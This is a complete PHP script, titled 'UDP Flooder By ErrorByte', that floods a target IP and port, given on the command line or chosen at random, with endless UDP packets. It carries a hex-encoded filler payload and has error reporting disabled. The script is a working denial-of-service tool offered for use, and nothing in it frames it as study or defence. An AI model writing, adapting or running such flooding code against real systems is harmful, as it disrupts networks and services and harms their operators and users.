<?php
error_reporting(0);
echo "\n############################";
echo "\n#                          #";
echo "\n# UDP Flooder By ErrorByte #";
echo "\n#                          #";
echo "\n############################\n";
if(!empty($argv[1]) && !empty($argv[2])) {
$host = $argv[1];
if($argv[2] == "random") {
$port = rand(1, 65000);
} else {
$port = $argv[2];
}
$het = "\x24\x73\x20\x3d\x20\x66\x73\x6f\x63\x6b\x6f\x70\x65\x6e\x28\x24\x68\x6f\x73\x74\x2c\x20\x24\x70\x6f\x72\x74\x29\x3b";
while(true) {
$s = fsockopen("udp://".$host, $port);
$r = fwrite($s, $het);
fclose($s);
if($r) {
echo "\nFlooding UDP To => $host";
} else {
echo "\nNetwork Error";
}
}
} else {
echo "\nphp udepe.php target_ip port\n";
}
?>
